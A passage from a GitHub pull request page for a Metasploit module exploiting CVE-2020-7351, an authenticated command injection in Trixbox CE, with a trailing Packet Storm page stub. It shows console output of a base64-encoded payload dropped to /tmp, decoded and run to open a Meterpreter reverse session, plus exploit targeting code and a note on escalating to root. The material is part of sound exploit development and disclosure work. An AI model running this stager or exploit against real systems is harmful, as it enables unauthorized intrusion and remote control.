f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAAAAAAAIAECACABAjqAAAAgAEAAAcAAAAAEAAAvUbnnCTb19l0JPRYMcmxH4PABDFoEQNoEeKzjZZ6ColQYT9uzAy9wJRZIO3ZzfmGGVkwV/KYykleFCsDOH77hZP3GmbRiFmpkJEvXl7KDZ6gCgn1oGCsgEJFZ18EI7cZuMcQaMWuXpzK0Nd/Czvrvm+wQz29SSZ+RVpz9lfDMWIo9/jzzTh69jJZwvfMmjJDzZoyswMa>>'/tmp/OQykC.b64' ; ((which base64 >&2 && base64 -d -) || (which base64 >&2 && base64 --decode -) || (which openssl >&2 && openssl enc -d -A -base64 -in /dev/stdin) || (which python >&2 && python -c 'import sys, base64; print base64.standard_b64decode(sys.stdin.read());') || (which perl >&2 && perl -MMIME::Base64 -ne 'print decode_base64($_)')) 2> /dev/null > '/tmp/RBUGF' < '/tmp/OQykC.b64' ; chmod +x '/tmp/RBUGF' ; '/tmp/RBUGF' ; rm -f '/tmp/RBUGF' ; rm -f '/tmp/OQykC.b64'"] [*] Transmitting intermediate stager...(106 bytes) [*] Sending stage (980808 bytes) to 192.168.205.150 [*] Meterpreter session 4 opened (192.168.205.1:4444 -> 192.168.205.150:60710) at 2020-05-03 23:27:00 -0500 [*] Command Stager progress - 100.00% done (799/799 bytes)  meterpreter > id [-] Unknown command: id. meterpreter > getuid Server username: no-user @ trixbox1.localdomain (uid=102, gid=103, euid=102, egid=103) meterpreter > exit [*] Shutting down Meterpreter...  [*] 192.168.205.150 - Meterpreter session 4 closed.  Reason: User exit  ```  Looking at the code for later versions I can see that your regex would work better. What I propose is perhaps combing both together:  ``` version = res.body.scan(/v(\d.\d.{0,1}\d{0,1})/).flatten.first     if version.nil?       version = res.body.scan(/Version: (\d.\d.{0,1}\d{0,1})/).flatten.first       if version.nil?         print_error("Unable to grab version of Trixbox installed on target!")         return nil        end     end  ```  Updated with that -more accurate- version detection. |
| --- |

All reactions

Sorry, something went wrong.

[![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=80&u=1144db3aa7b18a30fe7e7d91e1161aa11a819bfd&v=4)](/gwillcox-r7)

Copy link

Contributor

### **[gwillcox-r7](/gwillcox-r7)** commented [May 4, 2020](#issuecomment-623485562)

| [@stasinopoulos](https://github.com/stasinopoulos) Finally got this working, sorry for the delay. New code should be this (ignore the surrounding bits, this is more to show the update to the regex and to the version check):  ``` def get_target(res)     version = res.body.scan(/v(\d.\d.{0,1}\d{0,1}.{0,1}\d{0,1})/).flatten.first     if version.nil?       version = res.body.scan(/Version: (\d.\d.{0,1}\d{0,1}.{0,1}\d{0,1})/).flatten.first       if version.nil?         print_error("#{peer} - Unable to grab version of Trixbox CE installed on target!")         return nil       end     end     print_good("#{peer} - Trixbox CE v#{version} identified.")     if Gem::Version.new(version).between?(Gem::Version.new('2.6.0.0'), Gem::Version.new('2.8.0.4'))       @uri = normalize_uri(target_uri.path, '/maint/modules/endpointcfg/endpoint_devicemap.php')     elsif Gem::Version.new(version).between?(Gem::Version.new('2.0.0.0'), Gem::Version.new('2.4.9.9'))       @uri = normalize_uri(target_uri.path, '/maint/modules/11_endpointcfg/endpoint_devicemap.php')     elsif Gem::Version.new(version).between?(Gem::Version.new('1.2.0.0'), Gem::Version.new('1.9.9.9'))       @uri = normalize_uri(target_uri.path, '/maint/endpoint_devicemap.php')     else       return nil     end  ``` |
| --- |

 👍
1
 stasinopoulos reacted with thumbs up emoji

All reactions

* 👍
  1 reaction

Sorry, something went wrong.

[![@stasinopoulos](https://avatars.githubusercontent.com/u/5289251?s=40&v=4)](/stasinopoulos) [![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=40&v=4)](/gwillcox-r7)

`[Trixbox CE <= v2.8.0.4 Authenticated RCE](/rapid7/metasploit-framework/pull/13353/commits/18ebf5efa6a5857f0f09487400b9f607ee97b599 "Trixbox CE <= v2.8.0.4 Authenticated RCE

This module exploits a post-authentication OS command injection vulnerability found in Trixbox CE <= v2.8.0.4 which may allow arbitrary command execution on the underlying operating system.")`
 …

`[18ebf5e](/rapid7/metasploit-framework/pull/13353/commits/18ebf5efa6a5857f0f09487400b9f607ee97b599)`

```
This module exploits a post-authentication OS command injection vulnerability found in Trixbox CE <= v2.8.0.4 which may allow arbitrary command execution on the underlying operating system.
```

[![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=40&u=1144db3aa7b18a30fe7e7d91e1161aa11a819bfd&v=4)](/gwillcox-r7)
[gwillcox-r7](/gwillcox-r7)
merged commit [`d2b196f`](/rapid7/metasploit-framework/commit/d2b196f17257e419468ad3d743f5a9c013c8852e)
into
rapid7:master

[May 4, 2020](https://github.com/rapid7/metasploit-framework/pull/13353#event-3301734094)

[![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=80&u=1144db3aa7b18a30fe7e7d91e1161aa11a819bfd&v=4)](/gwillcox-r7)

Copy link

Contributor

### **[gwillcox-r7](/gwillcox-r7)** commented [May 4, 2020](#issuecomment-623720759) • edited by tperry-r7 Loading

| Release Notes This adds in a module for [CVE-2020-7351](https://attackerkb.com/topics/0VW2u2Lb4E/cve-2020-7351?referrer=msfReleaseNotes), an authenticated RCE in the `endpoint_devicemap.php` page of Trixbox CE devices running version 1.2.0 to 2.8.0.4 inclusive. Successful exploitation results in RCE as the `asterisk` user, however users can easily elevate their privileges to the `root` user by utilizing an outdated version of Nmap that comes installed by default on these devices. |
| --- |

All reactions

Sorry, something went wrong.

[![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=40&u=1144db3aa7b18a30fe7e7d91e1161aa11a819bfd&v=4)](/gwillcox-r7)
[gwillcox-r7](/gwillcox-r7)
added
the
[docs](/rapid7/metasploit-framework/labels/docs)
label
[May 4, 2020](#event-3301815130)

[![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=80&u=1144db3aa7b18a30fe7e7d91e1161aa11a819bfd&v=4)](/gwillcox-r7)

Copy link

Contributor

### **[gwillcox-r7](/gwillcox-r7)** commented [May 4, 2020](#issuecomment-623722179)

| [@stasinopoulos](https://github.com/stasinopoulos) Discussed this over Slack but leaving it here for reference: we had to rebase this into one commit due to a bunch of merge conflicts when trying to squash the 60+ commits we had before down into a smaller number of commits. Although my name may appear on the commit, your name still appears when doing `git log` so hopefully that should be okay.  Congrats again on your first commit to the framework and on getting a CVE for this bug! Look forwards to seeing more contributions in the future! |
| --- |

 ❤️
1
 stasinopoulos reacted with heart emoji

All reactions

* ❤️
  1 reaction

Sorry, something went wrong.

[![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=40&u=1144db3aa7b18a30fe7e7d91e1161aa11a819bfd&v=4)](/gwillcox-r7)
[gwillcox-r7](/gwillcox-r7)
added
the
[rn-modules](/rapid7/metasploit-framework/labels/rn-modules)
release notes for new or majorly enhanced modules
label
[May 7, 2020](#event-3314623041)

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Frapid7%2Fmetasploit-framework%2Fpull%2F13353)

Reviewers

[![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=40&v=4)](/gwillcox-r7) [gwillcox-r7](/gwillcox-r7)

gwillcox-r7 requested changes

[![@wvu](https://avatars.githubusercontent.com/u/4551878?s=40&v=4)](/wvu) [wvu](/wvu)

wvu left review comments

[![@todb-r7](https://avatars.githubusercontent.com/u/1170909?s=40&v=4)](/todb-r7) [todb-r7](/todb-r7)

todb-r7 left review comments

[![@bcoles](https://avatars.githubusercontent.com/u/434827?s=40&v=4)](/bcoles) [bcoles](/bcoles)

bcoles left review comments

Assignees

[![@todb-r7](https://avatars.githubusercontent.com/u/1170909?s=40&v=4)](/todb-r7) [todb-r7](/todb-r7)

[![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=40&v=4)](/gwillcox-r7) [gwillcox-r7](/gwillcox-r7)

Labels

[docs](/rapid7/metasploit-framework/labels/docs)
[module](/rapid7/metasploit-framework/labels/module)
[rn-modules](/rapid7/metasploit-framework/labels/rn-modules)
release notes for new or majorly enhanced modules

Projects

None yet

Milestone

No milestone

Development

Successfully merging this pull request may close these issues.

6 participants

[![@stasinopoulos](https://avatars.githubusercontent.com/u/5289251?s=52&v=4)](/stasinopoulos) [![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=52&v=4)](/gwillcox-r7) [![@bcoles](https://avatars.githubusercontent.com/u/434827?s=52&v=4)](/bcoles) [![@todb-r7](https://avatars.githubusercontent.com/u/1170909?s=52&v=4)](/todb-r7) [![@wvu](https://avatars.githubusercontent.com/u/4551878?s=52&v=4)](/wvu) [![@adfoster-r7](https://avatars.githubusercontent.com/u/60357436?s=52&v=4)](/adfoster-r7)

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from packetstormsecurity.com_560525d7_20250119_113600.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)


